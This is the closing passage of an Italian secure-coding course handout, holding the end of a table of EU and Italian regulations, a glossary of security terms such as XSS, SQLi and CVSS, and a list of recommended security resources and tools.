| **NIS 2 Art. 23** | Notifica incidenti: 24h + 72h + 30 giorni |
| **CRA (dic. 2027)** | Prodotti digitali: niente vulnerabilità note alla vendita, SBOM obbligatorio, patching ≥5 anni |
| **L. 4/2004** | Accessibilità prodotti digitali (PA e servizi al pubblico) |

---

# Appendice C — Glossario essenziale

| Termine | Significato |
|---------|-------------|
| **CIA Triad** | Confidentiality, Integrity, Availability — tre proprietà di sicurezza |
| **CVE** | Common Vulnerabilities and Exposures — identificatore di una vulnerabilità nota |
| **CVSS** | Common Vulnerability Scoring System — punteggio 0-10 di gravità |
| **DFD** | Data Flow Diagram — diagramma del flusso di dati in un sistema |
| **IDOR** | Insecure Direct Object Reference — accesso a dati altrui via ID URL |
| **OWASP** | Open Web Application Security Project — fondazione sicurezza web |
| **RCE** | Remote Code Execution — esecuzione di codice arbitrario da remoto |
| **SAST** | Static Application Security Testing — analisi statica del codice |
| **DAST** | Dynamic Application Security Testing — test runtime dell'app |
| **SCA** | Software Composition Analysis — analisi dipendenze |
| **SBOM** | Software Bill of Materials — inventario dipendenze |
| **STRIDE** | Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation — framework Microsoft di threat modeling |
| **XSS** | Cross-Site Scripting — iniezione di JavaScript nella pagina vittima |
| **SQLi** | SQL Injection — iniezione di codice SQL via input utente |
| **CSRF** | Cross-Site Request Forgery — richieste forgiate cross-site |
| **MFA** | Multi-Factor Authentication — autenticazione a più fattori |
| **HSTS** | HTTP Strict Transport Security — header che forza HTTPS |
| **CSP** | Content-Security-Policy — header che limita risorse caricabili |

---

# Appendice D — Risorse esterne consigliate

**OWASP**:
- OWASP Top 10: https://owasp.org/Top10
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org
- OWASP ASVS: https://owasp.org/asvs

**Lab pratici gratuiti**:
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- TryHackMe: https://tryhackme.com
- HackTheBox: https://www.hackthebox.com

**Database vulnerabilità**:
- NVD: https://nvd.nist.gov
- CVE.org: https://www.cve.org
- GitHub Advisories: https://github.com/advisories

**Autorità e enti**:
- Garante Privacy: https://www.garanteprivacy.it
- ENISA: https://www.enisa.europa.eu
- NIST CSRC: https://csrc.nist.gov

**Tool**:
- pip-audit: https://pypi.org/project/pip-audit/
- bandit: https://bandit.readthedocs.io
- Semgrep: https://semgrep.dev
- OWASP ZAP: https://www.zaproxy.org

**Repository del corso**:
- Materiali Secure Coding STEM IFTS: https://github.com/ss4i/corso-stem-ifts-secure-coding
- Corso ITS Cybersecurity 32h (estensione facoltativa): https://github.com/ss4i/corso-its-cybersecurity-32h

---

> *Dispensa per il corso IFTS STEM — Specialista nelle Tecniche di Evoluzione e Manutenzione del Software*
> *Modulo Secure Coding — 16 ore*
> *Versione 1.0 — Anno formativo 2024/2025*
> *Autore: Ing. Alessandro Manneschi*
> *Partenariato: Assoservizi · ITS Prodigi · Polo Tecnologico Manetti Porciatti · Università di Siena · Opus Automazione*
